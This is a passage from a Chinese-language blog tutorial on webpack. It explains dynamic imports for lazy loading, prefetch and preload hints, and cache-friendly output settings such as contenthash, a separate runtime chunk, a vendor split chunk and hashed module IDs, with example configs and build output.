class="line"></span><br><span class="line">export function getUsers() &#123;</span><br><span class="line">  return fetch(ENDPOINT)</span><br><span class="line">    .then(response &#x3D;&gt; &#123;</span><br><span class="line">      if (!response.ok) throw Error(response.statusText);</span><br><span class="line">      return response.json();</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(json &#x3D;&gt; json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<strong>src/index.html</strong>中加入以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const btn &#x3D; document.getElementById(&quot;btn&quot;);</span><br><span class="line"></span><br><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果运行npm run start，然后单击界面中的按钮，则没有任何反应。<br>现在想象一下，我们想在某人单击按钮后加载用户列表。 “幼稚”的方法可以使用静态导入从<strong>src / common / usersAPI.js</strong>中加载函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import &#123; getUsers &#125; from &quot;.&#x2F;common&#x2F;usersAPI&quot;;</span><br><span class="line"></span><br><span class="line">const btn &#x3D; document.getElementById(&quot;btn&quot;);</span><br><span class="line"></span><br><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUsers().then(json &#x3D;&gt; console.log(json));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>问题在于ES模块是静态的，这意味着我们无法在运行时更改导入。<br>通过动态导入，我们可以选择何时加载代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const getUserModule &#x3D; () &#x3D;&gt; import(&quot;.&#x2F;common&#x2F;usersAPI&quot;);</span><br><span class="line"></span><br><span class="line">const btn &#x3D; document.getElementById(&quot;btn&quot;);</span><br><span class="line"></span><br><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUserModule().then((&#123; getUsers &#125;) &#x3D;&gt; &#123;</span><br><span class="line">    getUsers().then(json &#x3D;&gt; console.log(json));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这里，我们创建一个函数来动态加载模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const getUserModule &#x3D; () &#x3D;&gt; import(&quot;.&#x2F;common&#x2F;usersAPI&quot;);</span><br></pre></td></tr></table></figure><p>然后在event listener中，我们将<strong>then（）</strong>链接到动态导入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUserModule().then(&#x2F;**&#x2F;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就可以通过对象解构来提取<strong>getUsers</strong>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUserModule().then((&#123; getUsers &#125;) &#x3D;&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后，我们照常使用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUserModule().then((&#123; getUsers &#125;) &#x3D;&gt; &#123;</span><br><span class="line">    getUsers().then(json &#x3D;&gt; console.log(json));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>现在，当第一次使用npm run start加载页面时，会看到控制台中已加载的main bundle：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-32e1222411f4d888.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>现在，仅在单击按钮时才加载<strong>“ ./common/usersAPI”</strong>：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7536d3f8fff57122.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>懒加载的chunk是<strong>0.js</strong><br>通过在导入路径前面加上**/ * webpackChunkName：“ name_here” * /**，我们还可以控制这个chunk的名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const getUserModule &#x3D; () &#x3D;&gt;</span><br><span class="line">  import(&#x2F;* webpackChunkName: &quot;usersAPI&quot; *&#x2F; &quot;.&#x2F;common&#x2F;usersAPI&quot;);</span><br><span class="line"></span><br><span class="line">const btn &#x3D; document.getElementById(&quot;btn&quot;);</span><br><span class="line"></span><br><span class="line">btn.addEventListener(&quot;click&quot;, () &#x3D;&gt; &#123;</span><br><span class="line">  getUserModule().then((&#123; getUsers &#125;) &#x3D;&gt; &#123;</span><br><span class="line">    getUsers().then(json &#x3D;&gt; console.log(json));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>0.js 现在将具有如下名称， usersAPI.js：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d30bcf2b722e23b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="动态import-与prefetch和preload"><a href="#动态import-与prefetch和preload" class="headerlink" title="动态import 与prefetch和preload"></a>动态import 与prefetch和preload</h3><p>webpack 4.6.0+增加了对prefetch和preload的支持。</p><p>在声明您的导入时使用这些内联指令可以使webpack输出“ Resource Hint”，它告诉浏览器：</p><ul><li>prefetch：将来可能需要一些导航资源</li><li>preload：当前导航期间可能需要资源</li></ul><p>一个简单的prefetch示例: 有一个<strong>HomePage</strong>组件，该组件呈现一个LoginButton组件，然后按需在单击后加载<strong>LoginModal</strong>组件。<br><strong>LoginButton.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;...</span><br><span class="line">import(&#x2F;* webpackPrefetch: true *&#x2F; &#39;LoginModal&#39;);</span><br></pre></td></tr></table></figure><p>这将使**&lt;link rel =“ prefetch” href =“ login-modal-chunk.js”&gt;<strong>附加在页面顶部，指示浏览器在空闲时间预取</strong>login-modal-chunk.js** 文件。<br><em>一旦父块被加载，webpack将添加prefetch提示。</em></p><p>与prefetch相比，Preload指令有很多区别：</p><ul><li>preload的块开始并行于父块加载。 父块完成加载后，prefetch 才开始。</li><li>preload的块具有中等优先级，可以立即下载。 浏览器空闲时，才会下载prefetch的块。</li><li>父块应立即请求preload的块。 prefetch的块可以在将来的任何时候使用。</li><li>浏览器支持不同。</li></ul><p>一个简单的预加载示例： 有一个组件，该组件始终依赖于应放在单独块中的大库。<br>让我们想象一个需要巨大ChartingLibrary的组件ChartComponent。 他将显示一个LoadingIndicator，并即时按需导入ChartingLibrary：<br><strong>ChartComponent.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;...</span><br><span class="line">import(&#x2F;* webpackPreload: true *&#x2F; &#39;ChartingLibrary&#39;);</span><br></pre></td></tr></table></figure><p>当请求使用ChartComponent的页面时，也会通过&lt;link rel =“ preload”&gt;请求charting-library-chunk。 假设页面块较小并且完成得比较快，该页面将显示一个LoadingIndicator，直到已经请求的制图库块完成为止。 这将增加一点加载时间，因为它只需要一个往返而不是两个。 特别是在高延迟环境中。</p><p>错误地使用webpackPreload实际上会影响性能，因此使用时务必小心。</p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>我们使用webpack bundle了模块化应用程序，从而产生了可部署的/ dist目录。 将/ dist的内容部署到服务器后，客户端（通常是浏览器）将访问该服务器以抢占该站点及其资产。 最后一步可能很耗时，这就是为什么浏览器使用缓存技术的原因。 这使站点能够以更少的不必要的网络流量更快地加载。 但是，当需要下载新代码时，它也会引起问题。</p><p>下面重点介绍确保除非打包文件的内容已更改，否则确保由webpack编译生成的文件可以保持缓存的配置。</p><h5 id="输出文件名"><a href="#输出文件名" class="headerlink" title="输出文件名"></a>输出文件名</h5><p>我们可以使用output.filename替换设置来定义输出文件的名称。 webpack提供了一种使用方括号括起来的字符串来替代文件名的模板方法。 [contenthash]替换将基于resource的内容添加唯一的哈希。 当resource的内容更改时，[contenthash]也将更改。</p><p>让我们使用示例从输出管理插件开始设置项目，因此我们不必手动维护index.html文件：<br><strong>project</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">webpack-demo</span><br><span class="line">|- package.json</span><br><span class="line">|- webpack.config.js</span><br><span class="line">|- &#x2F;dist</span><br><span class="line">|- &#x2F;src</span><br><span class="line">  |- index.js</span><br><span class="line">|- &#x2F;node_modules</span><br></pre></td></tr></table></figure><p><strong>webpack.config.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const &#123; CleanWebpackPlugin &#125; &#x3D; require(&#39;clean-webpack-plugin&#39;);</span><br><span class="line">const HtmlWebpackPlugin &#x3D; require(&#39;html-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">  plugins: [</span><br><span class="line">    &#x2F;&#x2F; new CleanWebpackPlugin([&#39;dist&#x2F;*&#39;]) for &lt; v2 versions of CleanWebpackPlugin</span><br><span class="line">    new CleanWebpackPlugin(),</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">     title: &#39;Output Management&#39;,</span><br><span class="line">     title: &#39;Caching&#39;,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  output: &#123;</span><br><span class="line">   filename: &#39;bundle.js&#39;,</span><br><span class="line">   filename: &#39;[name].[contenthash].js&#39;,</span><br><span class="line">    path: path.resolve(__dirname, &#39;dist&#39;),</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用此配置运行我们的构建脚本npm run build，将产生以下输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                       Asset       Size  Chunks                    Chunk Names</span><br><span class="line">main.7e2c49a622975ebd9b7e.js     544 kB       0  [emitted]  [big]  main</span><br><span class="line">                  index.html  197 bytes          [emitted]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如图所见，bundle包的名称现在反映了其内容（通过hash）。 如果我们在不进行任何更改的情况下运行另一个构建，我们希望该文件名保持不变。 但是，如果我们再次运行它，我们可能会发现情况并非如此：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                       Asset       Size  Chunks                    Chunk Names</span><br><span class="line">main.205199ab45963f6a62ec.js     544 kB       0  [emitted]  [big]  main</span><br><span class="line">                  index.html  197 bytes          [emitted]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这是因为webpack在条目块中包含某些样板，特别是runtime和manifest。<br>输出可能会有所不同，具体取决于您当前的Webpack版本。 较新的版本可能没有与某些较旧的版本相同的哈希问题，但是为了安全起见，仍然建议执行以下步骤。</p><h5 id="提取样板"><a href="#提取样板" class="headerlink" title="提取样板"></a>提取样板</h5><p>正如我们在代码拆分中所了解的那样，SplitChunksPlugin可用于将模块拆分为单独的包。 webpack提供了优化功能，可以使用optimization.runtimeChunk选项将运行时代码拆分为单独的块。 将其设置为single可以为所有块创建单个运行时bundle包：<br><strong>webpack.config.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const &#123; CleanWebpackPlugin &#125; &#x3D; require(&#39;clean-webpack-plugin&#39;);</span><br><span class="line">const HtmlWebpackPlugin &#x3D; require(&#39;html-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">  plugins: [</span><br><span class="line">    &#x2F;&#x2F; new CleanWebpackPlugin([&#39;dist&#x2F;*&#39;]) for &lt; v2 versions of CleanWebpackPlugin</span><br><span class="line">    new CleanWebpackPlugin(),</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: &#39;Caching&#39;,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: &#39;[name].[contenthash].js&#39;,</span><br><span class="line">    path: path.resolve(__dirname, &#39;dist&#39;),</span><br><span class="line">  &#125;,</span><br><span class="line"> optimization: &#123;</span><br><span class="line">   runtimeChunk: &#39;single&#39;,</span><br><span class="line"> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>让我们运行另一个构建，以查看提取的运行时bundle包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hash: 82c9c385607b2150fab2</span><br><span class="line">Version: webpack 4.12.0</span><br><span class="line">Time: 3027ms</span><br><span class="line">                          Asset       Size  Chunks             Chunk Names</span><br><span class="line">runtime.cc17ae2a94ec771e9221.js   1.42 KiB       0  [emitted]  runtime</span><br><span class="line">   main.e81de2cf758ada72f306.js   69.5 KiB       1  [emitted]  main</span><br><span class="line">                     index.html  275 bytes          [emitted]</span><br><span class="line">[1] (webpack)&#x2F;buildin&#x2F;module.js 497 bytes &#123;1&#125; [built]</span><br><span class="line">[2] (webpack)&#x2F;buildin&#x2F;global.js 489 bytes &#123;1&#125; [built]</span><br><span class="line">[3] .&#x2F;src&#x2F;index.js 309 bytes &#123;1&#125; [built]</span><br><span class="line">    + 1 hidden module</span><br></pre></td></tr></table></figure><p>将第三方库（例如lodash或react）提取到单独的供应商块中也是一个好习惯，因为与我们的本地源代码相比，第三方供应商块的更改可能性较小。 此步骤将允许客户端向服务器请求更少的请求以保持最新。 这可以通过使用SplitChunksPlugin的如下示例中演示的SplitChunksPlugin的cacheGroups选项来完成。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  &#x2F;&#x2F;...</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      cacheGroups: &#123;</span><br><span class="line">        commons: &#123;</span><br><span class="line">          test: &#x2F;[\\&#x2F;]node_modules[\\&#x2F;]&#x2F;,</span><br><span class="line">          name: &#39;vendors&#39;,</span><br><span class="line">          chunks: &#39;all&#39;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">这可能会导致包含所有外部程序包的较大块。 建议仅包括您的核心框架和实用程序，并动态加载其余依赖项。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>让我们使用带有下一个参数的cacheGroups添加optimization.splitChunks并构建：<br><strong>webpack.config.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const &#123; CleanWebpackPlugin &#125; &#x3D; require(&#39;clean-webpack-plugin&#39;);</span><br><span class="line">const HtmlWebpackPlugin &#x3D; require(&#39;html-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">  plugins: [</span><br><span class="line">    &#x2F;&#x2F; new CleanWebpackPlugin([&#39;dist&#x2F;*&#39;]) for &lt; v2 versions of CleanWebpackPlugin</span><br><span class="line">    new CleanWebpackPlugin(),</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: &#39;Caching&#39;,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: &#39;[name].[contenthash].js&#39;,</span><br><span class="line">    path: path.resolve(__dirname, &#39;dist&#39;),</span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    runtimeChunk: &#39;single&#39;,</span><br><span class="line">   splitChunks: &#123;</span><br><span class="line">     cacheGroups: &#123;</span><br><span class="line">       vendor: &#123;</span><br><span class="line">         test: &#x2F;[\\&#x2F;]node_modules[\\&#x2F;]&#x2F;,</span><br><span class="line">         name: &#39;vendors&#39;,</span><br><span class="line">         chunks: &#39;all&#39;,</span><br><span class="line">       &#125;,</span><br><span class="line">     &#125;,</span><br><span class="line">   &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>运行另一个build，查看我们的新供应商bundle包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                          Asset       Size  Chunks             Chunk Names</span><br><span class="line">runtime.cc17ae2a94ec771e9221.js   1.42 KiB       0  [emitted]  runtime</span><br><span class="line">vendors.a42c3ca0d742766d7a28.js   69.4 KiB       1  [emitted]  vendors</span><br><span class="line">   main.abf44fedb7d11d4312d7.js  240 bytes       2  [emitted]  main</span><br><span class="line">                     index.html  353 bytes          [emitted]</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在我们可以看到我们的 main bundle包不包含来自node_modules目录的供应商代码，并且大小减小到240个字节！</p><h5 id="模块标识符"><a href="#模块标识符" class="headerlink" title="模块标识符"></a>模块标识符</h5><p>让我们向项目添加另一个模块print.js：<br><strong>project</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webpack-demo</span><br><span class="line">|- package.json</span><br><span class="line">|- webpack.config.js</span><br><span class="line">|- &#x2F;dist</span><br><span class="line">|- &#x2F;src</span><br><span class="line">  |- index.js</span><br><span class="line"> |- print.js</span><br><span class="line">|- &#x2F;node_modules</span><br></pre></td></tr></table></figure><p><strong>print.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export default function print(text) &#123;</span><br><span class="line">  console.log(text);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>src/index.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> import _ from &#39;lodash&#39;;</span><br><span class="line">import Print from &#39;.&#x2F;print&#39;;</span><br><span class="line"></span><br><span class="line"> function component() &#123;</span><br><span class="line">   const element &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Lodash, now imported by this script</span><br><span class="line">   element.innerHTML &#x3D; _.join([&#39;Hello&#39;, &#39;webpack&#39;], &#39; &#39;);</span><br><span class="line">  element.onclick &#x3D; Print.bind(null, &#39;Hello webpack!&#39;);</span><br><span class="line"></span><br><span class="line">   return element;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> document.body.appendChild(component());</span><br></pre></td></tr></table></figure><p>运行build，我们希望仅更改main bundle的哈希，但是…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                           Asset       Size  Chunks                    Chunk Names</span><br><span class="line">  runtime.1400d5af64fc1b7b3a45.js    5.85 kB      0  [emitted]         runtime</span><br><span class="line">  vendor.a7561fb0e9a071baadb9.js     541 kB       1  [emitted]  [big]  vendor</span><br><span class="line">    main.b746e3eb72875af2caa9.js    1.22 kB       2  [emitted]         main</span><br><span class="line">                      index.html  352 bytes          [emitted]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>…我们可以看到这三个都有改变。 这是因为默认情况下，每个module.id都会根据解析顺序递增。 意思是当resolve顺序改变时，ID也将改变。 因此，回顾一下：</p><ul><li>main bunle包由于其新内容而发生了变化。</li><li>vendor bundle 软件已更改，因为其module.id已更改。</li><li>而且，runtme bundle发生了变化，因为它现在包含了对新模块的引用。</li></ul><p>第一个和最后一个改变是预料的，我们要修复vendor的hash。 让我们将<strong>optimization.moduleIds</strong>的值改成<strong>“ hashed”</strong>：<br><strong>webpack.config.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"> const &#123; CleanWebpackPlugin &#125; &#x3D; require(&#39;clean-webpack-plugin&#39;);</span><br><span class="line"> const HtmlWebpackPlugin &#x3D; require(&#39;html-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line"> module.exports &#x3D; &#123;</span><br><span class="line">   entry: &#39;.&#x2F;src&#x2F;index.js&#39;,</span><br><span class="line">   plugins: [</span><br><span class="line">     &#x2F;&#x2F; new CleanWebpackPlugin([&#39;dist&#x2F;*&#39;]) for &lt; v2 versions of CleanWebpackPlugin</span><br><span class="line">     new CleanWebpackPlugin(),</span><br><span class="line">     new HtmlWebpackPlugin(&#123;</span><br><span class="line">       title: &#39;Caching&#39;,</span><br><span class="line">     &#125;),</span><br><span class="line">   ],</span><br><span class="line">   output: &#123;</span><br><span class="line">     filename: &#39;[name].[contenthash].js&#39;,</span><br><span class="line">     path: path.resolve(__dirname, &#39;dist&#39;),</span><br><span class="line">   &#125;,</span><br><span class="line">   optimization: &#123;</span><br><span class="line">     moduleIds: &#39;hashed&#39;,</span><br><span class="line">     runtimeChunk: &#39;single&#39;,</span><br><span class="line">     splitChunks: &#123;</span><br><span class="line">       cacheGroups: &#123;</span><br><span class="line">         vendor: &#123;</span><br><span class="line">           test: &#x2F;[\\&#x2F;]node_modules[\\&#x2F;]&#x2F;,</span><br><span class="line">           name: &#39;vendors&#39;,</span><br><span class="line">           chunks: &#39;all&#39;,</span><br><span class="line">         &#125;,</span><br><span class="line">       &#125;,</span><br><span class="line">     &#125;,</span><br><span class="line">   &#125;,</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>现在，尽管有任何新的本地依赖关系，我们的供应商哈希值仍应在各个版本之间保持一致：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                          Asset       Size  Chunks             Chunk Names</span><br><span class="line">   main.216e852f60c8829c2289.js  340 bytes       0  [emitted]  main</span><br><span class="line">vendors.55e79e5927a639d21a1b.js   69.5 KiB       1  [emitted]  vendors</span><br><span class="line">runtime.725a1a51ede5ae0cfde0.js   1.42 KiB       2  [emitted]  runtime</span><br><span class="line">                     index.html  353 bytes          [emitted]</span><br><span class="line">Entrypoint main &#x3D; runtime.725a1a51ede5ae0cfde0.js vendors.55e79e5927a639d21a1b.js main.216e852f60c8829c2289.js</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>让我们修改<strong>src / index.js</strong>来临时删除额外的依赖项：<br><strong>src/index.js</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> import _ from &#39;lodash&#39;;</span><br><span class="line">-  import Print from &#39;.&#x2F;print&#39;;</span><br><span class="line">+ &#x2F;&#x2F; import Print from &#39;.&#x2F;print&#39;;</span><br><span class="line"></span><br><span class="line"> function component() &#123;</span><br><span class="line">   const element &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Lodash, now imported by this script</span><br><span class="line">   element.innerHTML &#x3D; _.join([&#39;Hello&#39;, &#39;webpack&#39;], &#39; &#39;);</span><br><span class="line"> -  element.onclick &#x3D; Print.bind(null, &#39;Hello webpack!&#39;);</span><br><span class="line"> +  &#x2F;&#x2F; element.onclick &#x3D; Print.bind(null, &#39;Hello 